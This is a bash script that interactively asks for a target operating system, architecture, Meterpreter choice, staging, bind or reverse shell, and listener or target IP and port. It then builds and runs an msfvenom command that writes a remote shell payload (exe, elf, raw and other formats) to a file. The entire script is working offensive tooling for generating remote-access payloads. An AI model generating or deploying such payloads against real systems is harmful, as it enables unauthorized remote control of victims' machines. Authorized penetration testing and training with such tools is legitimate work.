#!/bin/bash


echo "What is the operating system of your target? Example: windows, linux, osx"
read OS


correct_os="false"

validate_OS() {
case $OS in
	windows|linux|osx)
	correct_os="true"
	;;
	*)
	echo "$OS is not one of the options. Please enter the target operating system."
	read OS
	;;
esac
}

while [ "${correct_os}" = "false" ];
do
	validate_OS;
done

echo "Is it 64 bit or 32? Please type 32 or 64."
read architecture


correct_arc="false"

validate_arc() {
case $architecture in
        32|64)
        correct_arc="true"
        ;;
        *)
        echo "$architecture is not one of the options. Please choose 32 or 64 bit."
        read architecture
        ;;
esac
}

while [ "${correct_arc}" = "false" ];
do
        validate_arc;
done


no_arc_display(){
case $OS in
        windows)
                arc=""
        ;;
esac
}


meterpreter_question(){
echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
read meterpreter

correct_meterpreter="false"

validate_meterpreter() {
case $meterpreter in
        y|n)
        correct_meterpreter="true"
        ;;
        *)
        echo "$meterpreter is not one of the options. Please choose y to use meterpreter and n for no."
        read meterpreter
        ;;
esac
}

while [ "${correct_meterpreter}" = "false" ];
do
        validate_meterpreter;
done

}


linux_x86_meterpreter(){
case  $OS in
	linux|windows)
		meterpreter_question
	;;
	osx)
		meterpreter='n'
	;;
esac
}


echo "Would you like your payload staged or stageless? Please indicate 1 for staged and 2 for stageless"
read stage


correct_stage="false"

validate_stage() {
case $stage in
        1|2)
        correct_stage="true"
        ;;
        *)
        echo "$stage is not one of the options. Please choose 1 for staged or 2 for stageless."
        read stage
        ;;
esac
}

while [ "${correct_stage}" = "false" ];
do
        validate_stage;
done



stage_symbol=""


case $stage in
	1)
		stage_symbol="/"
	;;
	2)
		stage_symbol="_"
	;;
esac


case $architecture in
	32)
		arc="/x86"
		no_arc_display
		linux_x86_meterpreter
	;;

	64)
		arc="/x64"
		meterpreter_question
	;;
esac


echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
read shell

correct_shell="false"

validate_shell() {
case $shell in
        bind|reverse)
        correct_shell="true"
        ;;
        *)
        echo "$shell is not one of the options. Please choose bind or reverse."
        read shell
        ;;
esac
}

while [ "${correct_shell}" = "false" ];
do
        validate_shell;
done



ip_port=""
case $shell in
  reverse)
   	echo "Please enter your IP address."
        read ip
        echo "Please enter the port you would like to listen on."
        read port
	ip_port="LHOST=$ip LPORT=$port"
    ;;
  bind)
        echo "Please enter your target's IP address."
	read ip
	echo "Please enter the remote port."
	read port
	ip_port="RHOST=$ip RPORT=$port"
    ;;
esac


echo "What would you like the file format to be? Example: exe, raw, pl, rb, c, elf"
read format

correct_form="false"

validate_form() {
case $format in
        exe|raw|pl|rb|c|elf)
        correct_form="true"
        ;;
        *)
        echo "$format is not one of the options. Please choose from exe, raw, pl, rb, c, elf."
        read format
        ;;
esac
}

while [ "${correct_form}" = "false" ];
do
        validate_form;
done


payload=""
msfgen=""

echo "What would you like to name the file?"
read filename

use_meterpreter() {
	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
}


no_meterpreter() {
        msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
}

case  $meterpreter  in
	y)
	payload="${OS}${arc}/meterpreter"
	use_meterpreter
	echo "You will be creating a Meterpreter $shell shell payload for $architecture bit $OS in $format format."
        ;;
	n)
	payload="${OS}${arc}/shell"
	no_meterpreter
	echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
        ;;
	*)
esac

echo "msfvenom -p $msfgen"

msfvenom -p $msfgen > ${filename}.${format}
